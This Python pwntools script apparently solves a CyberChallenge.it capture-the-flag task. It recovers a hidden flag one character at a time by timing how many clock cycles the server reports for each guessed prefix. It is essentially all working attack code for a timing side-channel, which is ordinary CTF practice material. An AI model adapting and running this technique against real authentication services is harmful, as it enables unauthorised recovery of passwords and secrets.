import argparse
import re

from pwn import remote

HOST = "benchmark.challs.cyberchallenge.it"
PORT = 9031
ALPHABET = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789_{}-?!_"
CYCLES_RE = re.compile(r"checked in\s+(\d+)\s+clock cycles", re.IGNORECASE)


def read_cycles(io, payload: str) -> int:
    try:
        io.recvuntil(b"check:")
        io.sendline(payload.encode())

        while True:
            line = io.recvline().decode(errors="ignore")
            match = CYCLES_RE.search(line)
            if match:
                return int(match.group(1))
    except EOFError:
        # Connessione chiusa: puo' essere successo oppure disconnessione temporanea.
        return -1


def confirm_success(host: str, port: int, payload: str, attempts: int = 2) -> bool:
    eof_count = 0
    for _ in range(attempts):
        test = remote(host, port)
        try:
            cycles = read_cycles(test, payload)
            if cycles != -1:
                return False
            eof_count += 1
        finally:
            test.close()
    return eof_count == attempts


def main() -> None:
    parser = argparse.ArgumentParser(description="Simple timing helper")
    parser.add_argument("--host", default=HOST)
    parser.add_argument("--port", type=int, default=PORT)
    parser.add_argument("--start", default="CC")
    parser.add_argument("--alphabet", default=ALPHABET)
    parser.add_argument("--delta", type=int, default=20)
    parser.add_argument("--max-len", type=int, default=64)
    parser.add_argument("--stop", default="}")
    args = parser.parse_args()

    prefix = args.start
    io = remote(args.host, args.port)

    try:
        for _ in range(args.max_len):
            print(f"\n[+] Prefix: {prefix}")
            
            candidates = []
            for ch in args.alphabet:
                payload = prefix + ch
                cycles = read_cycles(io, payload)

                if cycles == -1:
                    if confirm_success(args.host, args.port, payload):
                        prefix += ch
                        print(f"\n[!] EOF confirmed on multiple connections → password found!")
                        print(f"[=] Final result: {prefix}")
                        return

                    # EOF non confermato: riconnetti e ritesta il carattere una volta.
                    print(f"  {ch!r}: transient EOF, retrying once")
                    io.close()
                    io = remote(args.host, args.port)
                    cycles = read_cycles(io, payload)
                    if cycles == -1:
                        print(f"  {ch!r}: EOF again (skip candidate)")
                        io.close()
                        io = remote(args.host, args.port)
                        continue

                candidates.append((ch, cycles))
                print(f"  {ch!r}: {cycles}")
            
            # Scegli il carattere con più cicli
            best_char, best_cycles = max(candidates, key=lambda x: x[1])
            prefix += best_char
            print(f"[+] Added: {best_char!r} (cycles={best_cycles})")

            if args.stop and prefix.endswith(args.stop):
                print("[+] Stop char reached")
                break

    finally:
        io.close()

    print(f"\n[=] Result: {prefix}")


if __name__ == "__main__":
    main()
